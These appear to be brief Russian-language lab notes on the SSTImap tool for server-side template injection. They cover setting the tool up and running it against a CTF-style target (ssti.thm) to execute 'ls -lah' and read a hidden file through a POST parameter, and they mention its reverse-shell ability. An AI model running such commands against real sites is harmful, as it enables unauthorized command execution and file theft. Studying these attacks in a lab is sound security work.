Инструмент для атаки на шаблонизаторы сайта, может определять какой тип шаблонизатора использует приложение 
Может автоматически выполнять атаки на известные SSTI уязвимости включая выполнение команд, реверс шелы и чтение файлов 
#### Запуск через виртуалльную среду:
```shell
cd ~/SSTImap
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 sstimap.py -X POST -u 'http://ExamplePage' -d 'page='
```

- `-X POST` — используемый HTTP-метод
- `-u` — целевой URL
- `-d` — параметр, в который будет внедряться payload (в данном случае, `page`)

Пример выполнения команды `ls`
```shell
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page=' -S 'ls -lah'
```
по факту главное правильно указать эксплоит
`cat`:
```shell
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page=' -S 'cat .hidden.txt'
```

